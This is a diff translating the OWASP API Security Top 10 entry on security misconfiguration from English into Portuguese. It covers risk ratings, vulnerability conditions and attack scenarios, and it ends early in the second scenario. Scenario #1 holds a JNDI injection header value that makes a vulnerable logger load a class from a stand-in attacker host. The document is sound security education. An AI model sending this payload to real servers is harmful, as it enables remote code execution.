@@ -1,50 +1,55 @@
 # API8:2023 Security Misconfiguration
 
-| Threat agents/Attack vectors | Security Weakness | Impacts |
+| Agentes Ameaça/Vetores Ataque | Falha Segurança | Impactos |
 | - | - | - |
-| API Specific : Exploitability **Easy** | Prevalence **Widespread** : Detectability **Easy** | Technical **Severe** : Business Specific |
-| Attackers will often attempt to find unpatched flaws, common endpoints, services running with insecure default configurations, or unprotected files and directories to gain unauthorized access or knowledge of the system. Most of this is public knowledge and exploits may be available. | Security misconfiguration can happen at any level of the API stack, from the network level to the application level. Automated tools are available to detect and exploit misconfigurations such as unnecessary services or legacy options. | Security misconfigurations not only expose sensitive user data, but also system details that can lead to full server compromise. |
+| Específico da API : Abuso **Fácil** | Prevalência **Predominante** : Detectability **Fácil** | Técnico **Severo** : Específico do Negócio |
+| Os atacantes frequentemente tentam encontrar falhas não corrigidas, _endpoints_ comuns, serviços a funcionar com configurações padrão inseguras ou arquivos e diretórios não protegidos para obter acesso não autorizado ou conhecimento do sistema. A maior parte disto é conhecimento público e os _exploits_ podem estar disponíveis. | A má configuração de segurança pode ocorrer em qualquer nível da API, desde o nível da rede até o nível da aplicação. Ferramentas automatizadas estão disponíveis para detectar e explorar más configurações, como serviços desnecessários ou opções antigas. | As más configurações de segurança não expõem apenas dados sensíveis dos utilizadores, mas também detalhes do sistema que podem levar a um compromisso total do servidor. |
 
-## Is the API Vulnerable?
+## A API é vulnerável?
 
-The API might be vulnerable if:
+A API pode ser vulnerável se:
 
-* Appropriate security hardening is missing across any part of the API stack,
-  or if there are improperly configured permissions on cloud services
-* The latest security patches are missing, or the systems are out of date
-* Unnecessary features are enabled (e.g. HTTP verbs, logging features)
-* There are discrepancies in the way incoming requests are processed by servers
-  in the HTTP server chain
-* Transport Layer Security (TLS) is missing
-* Security or cache control directives are not sent to clients
-* A Cross-Origin Resource Sharing (CORS) policy is missing or improperly set
-* Error messages include stack traces, or expose other sensitive information
+* As devidas proteções de segurança não foram aplicadas em qualquer parte da
+  API, ou se houver permissões mal configuradas em serviços de nuvem.
+* Os últimos _patches_ de segurança estão em falta ou os sistemas estão
+  desatualizados.
+* Funcionalidades desnecessárias estão ativadas (por exemplo, verbos HTTP,
+  funcionalidades de registo de eventos).
+* Existem discrepâncias na forma como os pedidos são processados pelos
+  servidores na cadeia de servidores HTTP.
+* A Segurança da Camada de Transporte (TLS) está em falta.
+* Diretivas de segurança ou de controlo de cache não são enviadas aos clientes.
+* Uma política de Partilha de Recursos entre Origens (CORS) está em falta ou mal
+  configurada.
+* As mensagens de erro incluem _stack traces_ ou expõem outras informações
+  sensíveis.
 
-## Example Attack Scenarios
+## Exemplos de Cenários de Ataque
 
-### Scenario #1
+### Cenário #1
 
-An API back-end server maintains an access log written by a popular third-party
-open-source logging utility with support for placeholder expansion and JNDI
-(Java Naming and Directory Interface) lookups, both enabled by default. For
-each request, a new entry is written to the log file with the following
-pattern: `<method> <api_version>/<path> - <status_code>`.
+Um servidor de API _back-end_ mantém um registo de acesso escrito por uma 
+utilidade de registo _open-source_ popular de terceiros, com suporte para 
+expansão de espaços reservados e pesquisas JNDI (Java Naming and Directory 
+Interface), ambos ativados por defeito. Para cada pedido, uma nova entrada é 
+escrita no ficheiro de registo com o seguinte padrão: 
+`<method> <api_version>/<path> - <status_code>`.
 
-A bad actor issues the following API request, which gets written to the access
-log file:
+Um ator malicioso emite o seguinte pedido de API, que é escrito no ficheiro de
+registo de acesso:
 
 ```
 GET /health
 X-Api-Version: ${jndi:ldap://attacker.com/Malicious.class}
 ```
 
-Due to the insecure default configuration of the logging utility and a
-permissive network outbound policy, in order to write the corresponding entry
-to the access log, while expanding the value in the `X-Api-Version` request
-header, the logging utility will pull and execute the `Malicious.class` object
-from the attacker's remote controlled server.
+Devido à configuração padrão insegura da utilidade de registo e a uma política 
+de rede de saída permissiva, para escrever a entrada correspondente no registo 
+de acesso, ao expandir o valor no cabeçalho `X-Api-Version` do pedido, a 
+utilidade de registo irá buscar e executar o objeto `Malicious.class` do 
+servidor controlado remotamente pelo atacante.
 
-### Scenario #2
+### Cenário #2
 
 A social network website offers a "Direct Message" feature that allows users to
 keep private conversations. To retrieve new messages for a specific
